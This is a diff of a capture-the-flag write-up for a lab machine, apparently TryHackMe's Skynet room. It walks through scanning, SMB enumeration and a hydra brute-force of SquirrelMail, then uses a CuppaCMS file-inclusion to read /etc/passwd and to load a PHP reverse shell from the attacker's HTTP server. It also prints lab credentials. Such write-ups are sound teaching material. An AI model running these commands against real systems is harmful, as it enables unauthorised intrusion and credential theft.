@@ -14,7 +14,7 @@ For our first command we will use rustscan, rustscan will scan all of the ports 
 ```rustscan -a 10.10.90.192```<br />
 SCREENSHOT<br />
 Now we know which ports are open, I run an Nmap scan with the flag -sV to find the service versions on the open ports.<br />
-nmap -sV -p22,80,110,139,143,445 10.10.90.192<br />
+```nmap -sV -p22,80,110,139,143,445 10.10.90.192```<br />
 SCREENSHOT2<br />
 
 ## Finding Vulnerabilities
@@ -28,7 +28,7 @@ I open up my browser and head over to the website http://10.10.90.192/<br />
 SCREENSHOT3<br />
 It appears to be some kind of search engine but none of the search features are working, I decide to start up gobuster
 and try to find other directories on the webserver. I entered the command below to enumerate directories.<br />
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/<br />
+```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/```<br />
 SCREENSHOT4<br />
 After trying to access each directory, I receive a forbidden page from every directory other than /squirrelmail
 Checking out this page I see a version 1.4.23, I do a little research to find out if this version is vulnerable...
@@ -40,40 +40,40 @@ Let's go back to our Nmap scan results and try looking at one of the other inter
 
 We can see in our Nmap scan that they have ports 139 and 445 open for a Samba. Let's try to enumerate the shares 
 and see if there's anything we can access.<br />
-smbclient -L 10.10.90.192<br />
+```smbclient -L 10.10.90.192```<br />
 SCREENSHOT5<br />
 We were able to list the shares on the server without a password for root, we can see we have access to the shares "anonymous" and "milesdyson".
 Let's try to connect to them now and see if they have any files of interest!
-smbclient \\\\10.10.90.192\\anonymous<br />
+```smbclient \\\\10.10.90.192\\anonymous```<br />
 Success! We were able to connect to the anonymous share without a password. Now we need to list the files avaialable on the share. <br />
-ls<br />
+```ls```<br />
 SCREENSHOT6<br />
 We can see we have a file named "attention.txt" and a directory named "logs" let's get the file attention.txt and then
 change to the "logs directory" and list the files<br />
-get attention.txt<br />
+```get attention.txt<br />
 cd logs<br />
-ls<br />
+ls```<br />
 SCREENSHOT7<br />
 We can see we have another 3 files inside of the "logs" directory, log1.txt, log2.txt, log3.txt. 
 Let's get the files and check out our other share.<br />
-get log1.txt<br />
+```get log1.txt<br />
 get log2.txt<br />
 get log3.txt<br />
 exit<br />
-smbclient \\\\10.10.90.192\\milesdyson<br />
+smbclient \\\\10.10.90.192\\milesdyson```<br />
 We receive the error "NT_STATUS_ACCESS_DENIED" when trying to connect to the share milesdyson with an empty password for root. 
 Let's try reading the files we got from the "anonymous" share. "attention.txt" "log1.txt" "log2.txt" "log3.txt"<br />
-cat attention.txt<br />
+```cat attention.txt```<br />
 SCREENSHOT8<br />
 Apparently a recent malfunction has caused passwords to be changed, we also get the name "Miles Dyson" A possible username?<br />
-cat log1.txt<br />
+```cat log1.txt```<br />
 SCREENSHOT9<br />
 log1.txt looks like it's full of passwords or usernames. Maybe we could try the possible username "Miles" or "MilesDyson" with this password list? 
 I see there's nothing inside of the log2.txt and log3.txt so I remove those.<br />
 
 Let's try bruteforcing the user "milesdyson" with the passwords we got from "log1.txt" on the squirrelmail service. 
 We know there's a vulnerability in the SquirrelMail service with an available exploit. To do this we will use hydra and burp suite.<br />
-hydra -l milesdyson -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"<br />
+```hydra -l milesdyson -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"```<br />
 Success! We have successfuly logged in with the password "cyborg007haloterminator"<br /> 
 Question 1:<br />
 **What is Miles password for his emails?** cyborg007haloterminator <br />
@@ -96,18 +96,18 @@ After converting the binary we see the string "balls have zero to me to me to me
 
 Inside the top e-mail we see a password reset for Samba, maybe we can access the milesdyson share with this password? ")s{A&2Z=F^n_E.B`" <br />
 Let's try connecting to the share... <br />
-smbclient \\\\10.10.90.192\\milesdyson -U milesdyson<br />
+```smbclient \\\\10.10.90.192\\milesdyson -U milesdyson```<br />
 Success! We managed to login to the SMB server, let's see what files are available on the share.<br />
-ls<br />
+```ls```<br />
 SCREENSHOT11<br />
 Nothing really stands out to us here except from the directory "notes" Let's change our directory and list what's inside.<br />
-cd notes<br />
-ls<br />
+```cd notes<br />
+ls```<br />
 SCREENSHOT12<br />
 There's an interesting file amongst all of the random files, let's download and take a look at "important.txt"<br />
-get important.txt<br />
+```get important.txt<br />
 exit<br />
-cat important.txt<br />
+cat important.txt```<br />
 SCREENSHOT13<br />
 Oooh! An interesting find... It looks like a directory on the webserver. It's probably the answer to our second question!
 Question 2:<br />
@@ -118,8 +118,8 @@ The answer was Remote File Inclusion but we found an exploit for Remote File Exe
 Let's try to exploit the vulnerability we found with the exploit CVE-2017-7692. <br />
 The exploit I will be using for this can be located here: https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html <br />
 Firstly I download the exploit and save it as exploit.sh in my /root directory (THM AttackBox Default Terminal Directory). We need to change the permissions of the file BEFORE executing it.<br />
-chmod +x exploit.sh<br />
-./exploit.sh http://10.10.90.192/squirrelmail<br />
+```chmod +x exploit.sh<br />
+./exploit.sh http://10.10.90.192/squirrelmail```<br />
 Enter the username and password for the squirrelmail service.<br />
 SCREENSHOT14<br />
 Something went wrong... We'll come back to this exploit later and see if we can figure out what went wrong. 
@@ -132,7 +132,7 @@ Our previous exploit failed but we haven't enumerated the hidden directory we fo
 ### Enumerating Hidden Directory
 
 Let's have a look at the hidden directory and see if there's anything valuable! We'll use gobuster again.<br />
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/45kra24zxs28v3yd/<br />
+```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.90.192/45kra24zxs28v3yd/```<br />
 SCREENSHOT15<br />
 We discovered a directory called /administrator/ let's have a look... It appears to be a login for CuppaCMS...<br />
 SCREENSHOT16<br />
@@ -145,15 +145,15 @@ For more information about the exploit: https://www.exploit-db.com/exploits/2597
 ### Exploiting CuppaCMS
 
 After reading the exploit page I know which page has the vulnerability and I try to exploit it.<br />
-http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br />
+```http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd```<br />
 SCREENSHOT17<br />
 My request was successful! Now let's create a reverse shell and try to escalate our privileges! <br />
 Firstly, we'll host our reverse php shell on a python http server to serve to the website<br />
-python3 -m http.server 8000<br />
+```python3 -m http.server 8000```<br />
 Secondly, we'll open up a listener on our attacking machine.<br />
-nc -lvnp 8888<br />
+```nc -lvnp 8888```<br />
 Third, we'll get the target to execute our remote shell<br />
-10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.113.195:8000/shell.php<br />
+```http://10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.113.195:8000/shell.php```<br />
 SCREENSHOT18<br />
 Success! We now have a shell, we can see from the output that we are user ID 33 www-data<br />
 Before trying to escalate our privileges let's have a look around on the current user to see if we can find the user flag. 
@@ -166,7 +166,7 @@ Question 4:<br />
 ## Privilege Escalation
 
 Since the shell we got isn't very stable, let's use Python to help that.<br />
-python -c 'import pty;pty.spawn("/bin/bash")'<br />
+```python -c 'import pty;pty.spawn("/bin/bash")'<br />```
 SCREENSHOT20<br />
 Alright! Let's see what we can do about escalating our privileges, I'll start first by checking what kernel they are using.<br />
 uname -a<br />
